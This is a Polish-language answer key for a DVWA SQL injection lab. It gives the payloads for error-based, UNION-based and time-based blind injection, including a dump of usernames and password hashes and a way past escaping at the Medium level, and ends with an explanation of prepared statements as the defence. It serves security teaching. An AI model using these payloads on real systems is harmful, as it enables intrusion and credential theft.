##  Klucz Odpowiedzi i Wyjaśnienia – Laboratorium SQL Injection

### Zadanie 1: Rozpoznanie (Error-Based Recon) - Poziom Low

| **Krok**                           | **Payload**                                  | **Obserwacja / Wyjaśnienie**                                                                                                                                |
| ---------------------------------- | -------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1. Użycie znaku, który wywoła błąd | `admin'`                                     | Pojedynczy apostrof zamyka oryginalny ciąg znaków w zapytaniu (np. `... WHERE user_id = '`). Następnie reszta oryginalnego zapytania powoduje błąd składni. |
| 2. Analiza błędu                   | -                                            | Komunikat błędu ujawnia fragment: `...check the manual that corresponds to your **MySQL** server version...`.                                               |
| **Odpowiedź:**                     | **Silnik bazy danych:** MySQL (lub MariaDB). | **Użyty Payload:** `'` (apostrof)                                                                                                                           |

**Wyjaśnienie:** W poziomie Low kod PHP wykonuje prostą konkatenację (łączenie stringów) i nie filtruje danych, co pozwala na naruszenie składni zapytania i zmuszenie bazy danych do ujawnienia informacji.

---

### Zadanie 2: Enumeracja Struktury (Union-Based) - Poziom Low

|**Krok**|**Payload**|**Obserwacja / Wyjaśnienie**|
|---|---|---|
|1. Ustalenie liczby kolumn (metoda `ORDER BY`)|`1' ORDER BY 3 -- -`|Wynik: Błąd typu `Unknown column '3' in 'order clause'`.|
|2. Weryfikacja liczby kolumn|`1' ORDER BY 2 -- -`|Wynik: Działa. **Liczba kolumn wynosi 2.**|
|3. Wydobycie nazw tabel|`1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema = 'dvwa' -- -`|Zapytanie używa `UNION` do połączenia z **`information_schema.tables`** (tabela metadanych), filtrując wyniki do bieżącej bazy (`dvwa`).|
|**Odpowiedź:**|**Liczba kolumn:** 2|**Nazwy tabel:** `guestbook`, `users`|

**Wyjaśnienie:** Operator `UNION` łączy wyniki dwóch zapytań, pod warunkiem, że mają tę samą liczbę kolumn i zgodne typy danych. Używając `information_schema`, atakujący może zidentyfikować wszystkie tabele w bazie.

---

### Zadanie 3: Kradzież Danych (Data Dump) - Poziom Low

|**Krok**|**Payload**|**Obserwacja / Wyjaśnienie**|
|---|---|---|
|1. Wydobycie loginów i haseł|`1' UNION SELECT user, password FROM users -- -`|Dwa pola (login i hasło) są pobierane z tabeli `users` i wyświetlane w kolumnach wynikowych oryginalnego zapytania.|
|2. Formatowanie (opcjonalne, ale lepsze)|`1' UNION SELECT CONCAT(user, 0x3a, password), 2 FROM users -- -`|Użycie funkcji `CONCAT()` łączy login i hasło, rozdzielone dwukropkiem (`0x3a` to kod szesnastkowy dwukropka), co ułatwia odczyt.|
|**Odpowiedź:**|**Payload:** Zobacz Krok 1 lub 2|**Hash dla 1337:** `5a105e8b9d40e1329780d62ea226b876`|

**Wyjaśnienie:** Po identyfikacji tabeli `users`, atakujący używa standardowej klauzuli `SELECT` do pobrania wrażliwych danych. Hasła są haszowane (MD5), co jest zabezpieczeniem przed prostym odczytem, ale nie przed późniejszym łamaniem.

---

### Zadanie 4: Poziom Medium (Omijanie filtrów)

| **Krok**                                 | **Payload**                                                    | **Obserwacja / Wyjaśnienie**                                                                                                                                                                                                                                                                                                                                                                                              |
| ---------------------------------------- | -------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1. Zmiana na Medium i przechwycenie POST | -                                                              | Aplikacja na poziomie Medium prawdopodobnie używa funkcji `mysql_real_escape_string()` na wejściu.                                                                                                                                                                                                                                                                                                                        |
| 2. Payload bez apostrofów                | `1 UNION SELECT 1, @@version`                                  | W poziomie Medium, kod PHP **nie otacza** zmiennej `$id` apostrofami (`SELECT ... WHERE id = $id`).                                                                                                                                                                                                                                                                                                                       |
| 3. Wyjaśnienie dlaczego działa           | -                                                              | Funkcja `mysql_real_escape_string` (lub jej odpowiednik) jest przeznaczona do zabezpieczania **ciągów znaków (stringów)** wstawianych do zapytań. Ponieważ w zapytaniu na poziomie Medium zmienna `$id` nie jest otoczona apostrofami (jest traktowana jak **liczba**), funkcja ta jest omijana. Wstrzyknięty ciąg jest traktowany przez bazę danych jako numeryczny identyfikator, po którym następuje klauzula `UNION`. |
| **Odpowiedź:**                           | **Zmodyfikowany parametr `id`:** `1 UNION SELECT 1, @@version` | **Wyjaśnienie:** Brak apostrofów wokół zmiennej `$id` w kodzie PHP sprawia, że filtracja `mysql_real_escape_string` jest bezużyteczna, ponieważ jej celem jest zabezpieczenie stringów.                                                                                                                                                                                                                                   |

---

### Zadanie 5: Blind SQL Injection (Time-Based) & Logika Ataku - Poziom Low

#### Część A: Proof of Concept (Payload)

|**Krok**|**Payload**|**Obserwacja / Wyjaśnienie**|
|---|---|---|
|1. Test opóźnienia|`1' AND IF(SUBSTRING(@@version, 1, 1) = '5', sleep(3), 0) -- -`|**IF:** Jeśli pierwszy znak wersji bazy danych to '5' (warunek), **sleep(3)** (wykonaj opóźnienie 3 sekundy), **0** (w przeciwnym razie wykonaj natychmiast).|
|**Odpowiedź:**|`1' AND IF(SUBSTRING(@@version, 1, 1) = '5', sleep(3), 0) -- -`|Jeśli serwer jest MySQL 5.x, strona załaduje się z opóźnieniem.|

#### Część B: Opis Algorytmu / Pseudokod

**Cel:** Odgadnięcie hasła administratora znak po znaku (np. 32-znakowego hasha).

1. **Ustalenie Długości:**
    
    - Wykorzystaj pętlę i funkcję `LENGTH()`. Sprawdzaj, czy `LENGTH(password) = L` dla rosnących wartości L, aż nastąpi opóźnienie.
        
2. **Wyszukiwanie Binarne (Dla każdego znaku):**
    
    - **Pętla Zewnętrzna:** Iteruj po każdej pozycji hasła (od $i=1$ do $L$).
        
    - **Pętla Wewnętrzna:** Użyj wyszukiwania binarnego (metoda połówkowa) w zakresie kodów ASCII (np. 48-122).
        
    - Sprawdzaj warunek typu: `ASCII(SUBSTRING(password, i, 1)) > SRODEK`.
        
        - Jeśli nastąpi **Opóźnienie (TRUE)**: Szukany znak jest w górnej połowie.
            
        - Jeśli **Brak Opóźnienia (FALSE)**: Szukany znak jest w dolnej połowie.
            
    - Kontynuuj zawężanie zakresu, aż znajdziesz dokładny kod ASCII.
        
3. **Rekonstrukcja:** Zamień znaleziony kod ASCII na znak i dołącz go do odgadywanego hasła.
    

---

### Zadanie 6: Analiza kodu i mechanizmy obronne (Impossible Level)

**Opis mechanizmu obronnego: Prepared Statements (Zapytania Parametryzowane)**

|**Wymagany element**|**Wyjaśnienie**|
|---|---|
|**Różnica (Low vs. Impossible)**|Poziom **Low** używa **konkatenacji stringów** (składnia i dane są łączone w jednym ciągu). Poziom **Impossible** używa metody PDO, która rozdziela **szablon zapytania SQL** od **danych wejściowych** (parametrów).|
|**Traktowanie danych vs. struktury**|Silnik bazy danych w Prepared Statements traktuje strukturę (`SELECT * FROM users WHERE user_id = :id`) jako **stały, zablokowany kod**, który jest kompilowany raz. Dane wejściowe (np. `' OR 1=1 #`) są przekazywane **osobno** i traktowane są **wyłącznie jako wartości** (literale), a nie jako części składowe kodu SQL.|
|**Dlaczego `' OR 1=1 #` nie działa**|Ponieważ dane wejściowe są traktowane jako **jedna, nienaruszalna wartość** dla parametru `:id`. Baza danych szuka więc użytkownika, którego ID **dosłownie** wynosi `' OR 1=1 #`. Ponieważ taki ID nie istnieje, zapytanie zwraca pusty wynik, a logika `OR 1=1` nigdy nie jest brana pod uwagę jako polecenie SQL.|